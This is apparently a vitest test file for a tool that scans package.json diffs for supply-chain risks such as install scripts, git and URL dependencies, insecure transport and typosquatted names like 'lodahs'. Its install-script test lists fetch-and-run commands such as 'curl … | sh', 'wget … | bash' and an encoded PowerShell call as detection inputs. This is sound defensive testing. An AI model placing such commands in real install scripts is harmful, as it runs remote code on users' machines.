import { describe, expect, it } from "vitest";
import { patch } from "../context/test-support";
import type { ChangedFile } from "../context/types";
import {
  analyzeManifestChanges,
  dependencySection,
  dependencySignals,
  imitatedPackage,
  oneEditApart,
  signalFindings,
} from "./dependencies";

const manifestFile = (...lines: string[]): ChangedFile => ({
  path: "package.json",
  status: "modified",
  additions: 1,
  deletions: 0,
  addedLines: [],
  patch: patch(...lines),
});

const analyze = (...lines: string[]) => analyzeManifestChanges([manifestFile(...lines)]);

describe("reading a manifest diff", () => {
  it("finds new and changed dependencies with the section they are in", () => {
    const changes = analyze(
      "@@ -3,6 +3,7 @@",
      '   "dependencies": {',
      '-    "express": "^4.18.0",',
      '+    "express": "^4.19.2",',
      '+    "zod": "^4.6.5",',
      "   },",
      '   "devDependencies": {',
      '+    "vitest": "^5.0.3"',
    );
    expect(changes.dependencies.map((d) => [d.name, d.section, d.from, d.to, d.line])).toEqual([
      ["express", "dependencies", "^4.18.0", "^4.19.2", 4],
      ["zod", "dependencies", undefined, "^4.6.5", 5],
      ["vitest", "devDependencies", undefined, "^5.0.3", 8],
    ]);
  });

  it("ignores a line that only moved", () => {
    const changes = analyze(
      "@@ -3,4 +3,4 @@",
      '   "dependencies": {',
      '-    "a": "^1.0.0",',
      '     "b": "^2.0.0",',
      '+    "a": "^1.0.0",',
      "   }",
    );
    expect(changes.dependencies).toEqual([]);
  });

  it("lists removed dependencies for the prompt", () => {
    const changes = analyze(
      "@@ -3,4 +3,3 @@",
      '   "dependencies": {',
      '-    "left-pad": "^1.3.0",',
      "   }",
    );
    expect(changes.removed).toEqual([{ path: "package.json", name: "left-pad" }]);
  });

  it("reads scripts, and tells install scripts from the rest", () => {
    const changes = analyze(
      "@@ -3,4 +3,6 @@",
      '   "scripts": {',
      '+    "build": "tsc",',
      '+    "postinstall": "node setup.js"',
      "   }",
    );
    expect(changes.scripts.map((s) => [s.name, s.to])).toEqual([
      ["build", "tsc"],
      ["postinstall", "node setup.js"],
    ]);
  });

  it("decides by the value when the hunk does not show the section", () => {
    const changes = analyze(
      "@@ -20,3 +20,5 @@",
      '+    "left-thing": "^1.0.0",',
      '+    "postinstall": "node x.js",',
      '+    "version": "1.2.3",',
      '+    "main": "dist/index.js",',
      '+    "node": ">=24",',
      '+    "cli": "bin/cli.js",',
    );
    expect(changes.dependencies.map((d) => d.name)).toEqual(["left-thing"]);
    expect(changes.scripts.map((s) => s.name)).toEqual(["postinstall"]);
  });

  it("reads a package.json in a subdirectory and skips deleted ones", () => {
    const nested = {
      ...manifestFile("@@ -1,2 +1,3 @@", '   "dependencies": {', '+    "a": "^1.0.0"'),
      path: "packages/x/package.json",
    };
    const gone = { ...nested, path: "old/package.json", status: "removed" as const };
    const changes = analyzeManifestChanges([nested, gone]);
    expect(changes.dependencies.map((d) => d.path)).toEqual(["packages/x/package.json"]);
  });

  it("ignores everything that is not a manifest", () => {
    const changes = analyzeManifestChanges([
      { ...manifestFile("@@ -1 +1 @@", '+    "a": "^1.0.0"'), path: "package-lock.json" },
    ]);
    expect(changes.dependencies).toEqual([]);
  });

  it("redacts a credential in the evidence line", () => {
    const changes = analyze(
      "@@ -3,3 +3,4 @@",
      '   "dependencies": {',
      '+    "x": "git+https://user:s3cretpass@git.example.test/x.git"',
    );
    expect(changes.dependencies[0]!.text).not.toContain("s3cretpass");
  });
});

describe("rules", () => {
  const signals = (...lines: string[]) => dependencySignals(analyze(...lines));
  const deps = (entry: string) =>
    signals("@@ -3,3 +3,4 @@", '   "dependencies": {', `+    ${entry}`, "   }");

  it("flags an install script, and a stronger one when it downloads or evaluates code", () => {
    const quiet = signals(
      "@@ -3,2 +3,3 @@",
      '   "scripts": {',
      '+    "install": "node-gyp rebuild"',
    );
    expect(quiet).toMatchObject([{ rule: "install_script", severity: "medium" }]);
    for (const command of [
      "curl -s https://x.example/a.sh | sh",
      "wget -qO- https://x.example/a | bash",
      'node -e "eval(process.argv[1])"',
      "powershell -enc AAAA",
    ]) {
      const strong = signals(
        "@@ -3,2 +3,3 @@",
        '   "scripts": {',
        `+    "postinstall": ${JSON.stringify(command)}`,
      );
      expect(strong, command).toMatchObject([
        { rule: "install_script_download", severity: "high" },
      ]);
    }
  });

  it("does not flag other scripts, or an install script that did not change", () => {
    expect(signals("@@ -3,2 +3,3 @@", '   "scripts": {', '+    "build": "tsc"')).toEqual([]);
    expect(
      signals(
        "@@ -3,2 +3,2 @@",
        '   "scripts": {',
        '-    "postinstall": "node a.js",',
        '+    "postinstall": "node a.js",',
      ),
    ).toEqual([]);
  });

  it("calls a changed install script changed", () => {
    const [signal] = signals(
      "@@ -3,2 +3,2 @@",
      '   "scripts": {',
      '-    "postinstall": "node a.js",',
      '+    "postinstall": "node b.js",',
    );
    expect(signal?.title).toBe("Changed `postinstall` install script");
  });

  it.each([
    ['"a": "git+https://github.com/acme/a.git"', "git_dependency"],
    ['"a": "git+https://github.com/acme/a.git#main"', "git_dependency"],
    ['"a": "git+ssh://git@github.com/acme/a.git#v1.0.0"', "git_dependency"],
    ['"a": "github:acme/a"', "git_dependency"],
    ['"a": "acme/a#semver:^1.0.0"', "git_dependency"],
    ['"a": "git://github.com/acme/a.git"', "insecure_transport"],
    ['"a": "http://example.test/a.tgz"', "insecure_transport"],
    ['"a": "https://example.test/a.tgz"', "url_dependency"],
  ])("flags %s as %s", (entry, rule) => {
    expect(deps(entry)).toMatchObject([{ rule }]);
  });

  it.each([
    '"a": "git+https://github.com/acme/a.git#0123456789abcdef0123456789abcdef01234567"',
    '"a": "^1.2.3"',
    '"a": "~1.2.3"',
    '"a": "1.2.3"',
    '"a": "latest"',
    '"a": "npm:other-name@^1.0.0"',
    '"a": "workspace:*"',
    '"a": "file:../a"',
    '"@acme/a": "^1.0.0"',
  ])("does not flag %s", (entry) => {
    expect(deps(entry)).toEqual([]);
  });

  it("flags a name next to a popular one, only when the dependency is new", () => {
    expect(deps('"lodahs": "^4.17.21"')).toMatchObject([{ rule: "typosquat" }]);
    expect(deps('"reactdom": "^19.0.0"')).toMatchObject([{ rule: "typosquat" }]);
    expect(deps('"expresss": "^4.0.0"')).toMatchObject([{ rule: "typosquat" }]);
    expect(
      signals(
        "@@ -3,3 +3,3 @@",
        '   "dependencies": {',
        '-    "lodahs": "^4.17.20",',
        '+    "lodahs": "^4.17.21",',
      ),
    ).toEqual([]);
  });

  it("does not flag popular, scoped or unrelated names", () => {
    for (const name of ["lodash", "react-dom", "@acme/lodahs", "zod", "my-company-utils", "ms"]) {
      expect(deps(`"${name}": "^1.0.0"`), name).toEqual([]);
    }
  });

  it("makes findings with the line, the fingerprint and the commit", () => {
    const [finding] = signalFindings(
      signals("@@ -3,2 +3,3 @@", '   "scripts": {', '+    "postinstall": "node a.js"'),
      "b".repeat(40),
    );
    expect(finding).toMatchObject({
      agent: "security",
      category: "security",
      filePath: "package.json",
      startLine: 4,
      endLine: 4,
      sourceCommitSha: "b".repeat(40),
    });
    expect(finding?.id).toMatch(/^[0-9a-f]{16}$/);
  });
});

describe("edit distance and imitation", () => {
  it("knows one edit", () => {
    expect(oneEditApart("lodash", "lodahs")).toBe(true); // swap
    expect(oneEditApart("lodash", "lodas")).toBe(true); // deletion
    expect(oneEditApart("lodash", "lodashh")).toBe(true); // insertion
    expect(oneEditApart("lodash", "lodesh")).toBe(true); // substitution
    expect(oneEditApart("lodash", "lodash")).toBe(false);
    expect(oneEditApart("lodash", "lodxxh")).toBe(false);
    expect(oneEditApart("lodash", "lod")).toBe(false);
  });

  it("names the package it seems to imitate", () => {
    expect(imitatedPackage("lodahs")).toBe("lodash");
    expect(imitatedPackage("lodash")).toBeUndefined();
    expect(imitatedPackage("@scope/lodahs")).toBeUndefined();
    expect(imitatedPackage("Lodahs")).toBeUndefined();
  });
});

describe("the prompt section", () => {
  it("is absent when nothing in the manifest changed", () => {
    expect(dependencySection(analyzeManifestChanges([]), [])).toBeUndefined();
  });

  it("lists what changed and what the platform already reported", () => {
    const changes = analyze(
      "@@ -3,6 +3,7 @@",
      '   "dependencies": {',
      '-    "express": "^4.18.0",',
      '+    "express": "^4.19.2",',
      '+    "internal": "github:acme/internal#main",',
      "   },",
      '   "scripts": {',
      '+    "postinstall": "node a.js"',
    );
    const section = dependencySection(changes, dependencySignals(changes))!;
    expect(section.title).toBe("Dependency changes");
    expect(section.body).toContain("New dependencies:\n- internal@github:acme/internal#main");
    expect(section.body).toContain("Changed dependencies:\n- express: ^4.18.0 -> ^4.19.2");
    expect(section.body).toContain("postinstall (runs on install): node a.js");
    expect(section.body).toContain("Already reported by the platform");
  });
});
